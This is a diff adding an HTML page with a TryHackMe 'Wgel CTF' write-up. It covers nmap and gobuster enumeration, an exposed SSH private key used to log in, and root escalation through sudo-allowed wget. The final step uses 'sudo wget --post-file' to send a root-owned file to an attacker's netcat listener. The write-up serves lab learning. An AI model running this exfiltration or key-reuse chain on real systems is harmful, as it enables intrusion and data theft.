@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wgel CTF Write-up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-body: #121212;
+            --bg-card: #1e1e1e;
+            --bg-sidebar: #181818;
+            --text-main: #e0e0e0;
+            --text-muted: #a0a0a0;
+            --accent: #00bcd4;
+            --accent-hover: #008ba3;
+            --border: #333333;
+            --code-bg: #2d2d2d;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            display: flex;
+            width: 100%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .sidebar {
+            width: 300px;
+            background-color: var(--bg-sidebar);
+            border-right: 1px solid var(--border);
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            height: 100vh;
+        }
+
+        .sidebar-nav {
+            margin-top: 40px;
+            width: 100%;
+        }
+
+        .back-link {
+            display: block;
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+            margin-bottom: 20px;
+            transition: color 0.2s;
+        }
+
+        .back-link:hover {
+            color: #fff;
+        }
+
+        .article-content {
+            flex: 1;
+            padding: 50px 80px;
+            overflow-y: auto;
+            line-height: 1.8;
+        }
+
+        .machine-info,
+        .toc {
+            width: 100%;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .machine-info h3,
+        .toc h3 {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 5px;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .machine-info ul,
+        .toc ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .machine-info li {
+            font-size: 0.9rem;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            text-decoration: none;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            transition: color 0.2s, padding-left 0.2s;
+            display: block;
+        }
+
+        .toc a:hover {
+            color: var(--accent);
+            padding-left: 5px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            color: var(--accent);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+
+        p {
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            font-size: 1rem;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            border: 1px solid var(--border);
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            color: #ff79c6;
+        }
+
+        .cmd-output {
+            color: #8be9fd;
+        }
+
+        img.screenshot {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            margin: 20px 0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .meta-tags {
+            margin-bottom: 40px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .tag {
+            background-color: var(--bg-card);
+            padding: 4px 10px;
+            border-radius: 4px;
+            margin-right: 10px;
+            border: 1px solid var(--border);
+        }
+
+        @media (max-width: 768px) {
+            .app-container {
+                flex-direction: column;
+            }
+            .sidebar {
+                width: 100%;
+                height: auto;
+                position: relative;
+            }
+            .article-content {
+                padding: 30px 20px;
+            }
+        }
+
+        .tools-section {
+            width: 100%;
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .tools-section h3 {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 5px;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .tool-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .tool-badge {
+            background-color: #252526;
+            color: #e0e0e0;
+            font-size: 0.8rem;
+            padding: 5px 10px;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            cursor: default;
+            transition: all 0.2s ease;
+        }
+
+        .tool-badge:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <aside class="sidebar">
+            <div class="sidebar-nav">
+                <a href="../index.html" class="back-link">← Back to Home</a>
+            </div>
+
+            <div class="machine-info">
+                <h3>Target Info</h3>
+                <ul>
+                    <li><strong>Name:</strong> Wgel CTF</li>
+                    <li><strong>Site:</strong> TryHackMe</li>
+                    <li><strong>OS:</strong> <span style="color: #ff79c6;">Linux</span></li>
+                    <li><strong>Difficulty:</strong> <span style="color: #50fa7b;">Easy</span></li>
+                </ul>
+            </div>
+
+            <div class="toc">
+                <h3>Table of Contents</h3>
+                <ul>
+                    <li><a href="#recon">1. Reconnaissance</a></li>
+                    <li><a href="#web">2. Web Enumeration</a></li>
+                    <li><a href="#ssh">3. SSH Access</a></li>
+                    <li><a href="#privesc">4. Privilege Escalation</a></li>
+                    <li><a href="#root">5. Root Flag</a></li>
+                </ul>
+            </div>
+            <div class="tools-section">
+                <h3>Tools Arsenal</h3>
+                <div class="tool-tags">
+                    <span class="tool-badge">Nmap</span>
+                    <span class="tool-badge">Gobuster</span>
+                    <span class="tool-badge">SSH</span>
+                    <span class="tool-badge">Wget</span>
+                    <span class="tool-badge">Netcat</span>
+                </div>
+            </div>
+            <div style="text-align: center; color: var(--text-muted); margin-top: auto;">
+                <p>Created by <strong style="color: #fff;">Kontowsky</strong></p>
+            </div>
+        </aside>
+
+        <article class="article-content">
+
+            <h1>Wgel CTF</h1>
+            <div class="meta-tags">
+                <span class="tag">TryHackMe</span>
+                <span class="tag">Linux</span>
+                <span class="tag">Privilege Escalation</span>
+                <span class="tag">Dec 05, 2025</span>
+            </div>
+
+            <p>
+                In this write-up, we tackle the "Wgel CTF" room. We will proceed through enumeration to find hidden directories and SSH keys,
+                gain initial user access, and finally exploit a binary allowed in sudoers to exfiltrate the root flag.
+		 <br>Link to the room: <a href="https://tryhackme.com/room/wgelctf" target="_blank">https://tryhackme.com/room/wgelctf</a>
+            </p>
+
+            <h2 id="recon">1. Reconnaissance</h2>
+            <p>
+                We start with a standard Nmap scan to check for open ports.
+                I used the <code>-T4</code> flag to speed up the process.
+            </p>
+            <pre><code>$ sudo nmap -T4 10.80.149.228</code></pre>
+
+            <img src="images_wgel-ctf/image-195.png" alt="Nmap Scan Results" class="screenshot">
+
+            <p>
+                The scan reveals two main services:
+            </p>
+            <ul>
+                <li><strong>22/tcp:</strong> SSH</li>
+                <li><strong>80/tcp:</strong> HTTP (Apache Server)</li>
+            </ul>
+
+            <h2 id="web">2. Web Enumeration</h2>
+            <p>
+                The web server displays a default Apache page. I used <strong>Gobuster</strong> to find hidden directories and discovered <code>/sitemap</code>.
+                Upon inspecting the source code of the page found there, I noticed a comment left for a user named <strong>Jessie</strong>.
+            </p>
+            
+            <img src="images_wgel-ctf/image-199.png" alt="Source Code Comment" class="screenshot">
+
+            <p>
+                This gives us a potential username. Further enumeration on the <code>/sitemap</code> directory revealed a hidden <code>.ssh</code> directory.
+            </p>
+            <pre><code>$ gobuster dir -u http://10.80.149.228/sitemap -w /usr/share/wordlists/dirb/big.txt</code></pre>
+
+            <img src="images_wgel-ctf/image-200.png" alt="Gobuster SSH Discovery" class="screenshot">
+            
+            <p>
+                Navigating to that directory allowed me to download a private SSH key (<code>id_rsa</code>).
+            </p>
+
+            <h2 id="ssh">3. SSH Access</h2>
+            <p>
+                With the username <strong>jessie</strong> and the private key found, I attempted to log in via SSH.
+                I made sure to set the correct permissions for the key file first.
+            </p>
+            <pre><code>$ chmod 600 ssh_key
+$ ssh jessie@10.80.149.228 -i ssh_key</code></pre>
+
+            <p>
+                The login was successful. I retrieved the user flag from the Documents folder.
+            </p>
+            <img src="images_wgel-ctf/image-201.png" alt="SSH Login" class="screenshot">
+            
+            <p>
+                <strong>User Flag:</strong> <code>[REDACTED]</code>
+            </p>
+
+            <h2 id="privesc">4. Privilege Escalation</h2>
+            <p>
+                To escalate privileges, I checked the user's sudo rights using the command <code>sudo -l</code>.
+            </p>
+            
+            <img src="images_wgel-ctf/image-203.png" alt="Sudo Permissions" class="screenshot">
+
+            <p>
+                The output shows that the user <code>jessie</code> can run <code>/usr/bin/wget</code> as root without a password.
+                This is a significant misconfiguration.
+            </p>
+
+            <h2 id="root">5. Root Flag</h2>
+            <p>
+                I consulted resources like GTFOBins and documentation to see how <code>wget</code> can be abused.
+                It allows sending files to a remote server using the <code>--post-file</code> option.
+            </p>
+            
+            <img src="images_wgel-ctf/image-209.png" alt="Wget Exploit Info" class="screenshot">
+
+            <p>
+                I set up a <strong>Netcat</strong> listener on my attack machine on port 8000 to receive the data.
+            </p>
+            <pre><code>$ nc -lvnp 8000</code></pre>
+
+            <p>
+                Then, on the target machine, I executed the following command to send the content of <code>root_flag.txt</code> to my listener:
+            </p>
+            <pre><code>$ sudo wget --post-file=/root/root_flag.txt 192.168.145.228:8000</code></pre>
+
+            <img src="images_wgel-ctf/image-208.png" alt="Wget Execution" class="screenshot">
+
+            <p>
+                The connection was established, and the root flag was received on my listener!
+            </p>
+            
+            <img src="images_wgel-ctf/image-207.png" alt="Root Flag Received" class="screenshot">
+
+            <p>
+                <strong>Root Flag:</strong> <code>[REDACTED]</code>
+            </p>
+
+        </article>
+    </div>
+<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "ed03f38c876b450aad0249d433086aae"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
